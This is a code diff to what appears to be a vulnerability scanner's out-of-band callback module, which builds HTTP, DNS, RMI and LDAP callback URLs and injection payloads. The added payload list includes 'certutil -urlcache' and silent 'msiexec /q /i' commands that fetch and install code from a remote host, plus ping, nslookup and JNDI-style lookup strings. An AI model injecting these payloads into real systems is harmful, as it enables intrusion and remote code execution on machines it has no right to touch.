@@ -97,12 +97,25 @@ def generate(urlpath, type="http"):
         hexdata = getrealdnsdata(urlpath)
         return None, hexdata  # will like None,rvzf74657374.log.evilhex.top
     elif type == "http":
+        '''
+        参数携带，根目录下的d参数，如/?d=asdadadffa,通过asdadadffa可查询。
+        '''
         hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
         '''
         return like: http://www.baidu.com?d=aaaasdfasd ,aaaasdfasd
         '''
         return "http://{}:{}/?d={}".format(reverse_set.get("reverse_http_ip"),
                                            reverse_set.get("reverse_http_port"), hexdata), hexdata
+    elif type == "http2":
+        '''
+        路径携带，必须以myscan_开头，如 /myscan_oaldj2n.xml ，这样的路径才会入库，通过myscan_oaldj2n.xml可查询。
+        '''
+        hexdata = "myscan_" + get_random_str(4).lower() + urlpath.decode()
+        '''
+        return like: http://www.baidu.com?d=aaaasdfasd ,aaaasdfasd
+        '''
+        return "http://{}:{}/{}".format(reverse_set.get("reverse_http_ip"),
+                                        reverse_set.get("reverse_http_port"), hexdata), hexdata
     elif type == "rmi":
         hexdata = get_random_str(4).lower() + binascii.b2a_hex(urlpath).decode()
         '''
@@ -118,7 +131,7 @@ def generate(urlpath, type="http"):
        '''
         return "ldap://{}:{}/{}".format(reverse_set.get("reverse_ldap_ip"),
                                         reverse_set.get("reverse_ldap_port"),
-                                        hexdata),hexdata
+                                        hexdata), hexdata
 
 
 def generate_reverse_payloads(urlpath, type="http"):
@@ -134,7 +147,7 @@ def generate_reverse_payloads(urlpath, type="http"):
         urlpath = urlpath.encode()
 
     payloads = {
-        "http": ["mshta {url}", "curl {url}", "wget {url}"],
+        "http": ["certutil -urlcache -split -f {url}", "msiexec /q /i {url}", "curl {url}", "wget {url}"],
         "dns": ["ping -n 2 {domain}", "ping -c 2 {domain}", "nslookup {domain}"],
         "rmi": ["rmi://{}:{}/{}"],
         "ldap": ["ldap://{}:{}/{}"],
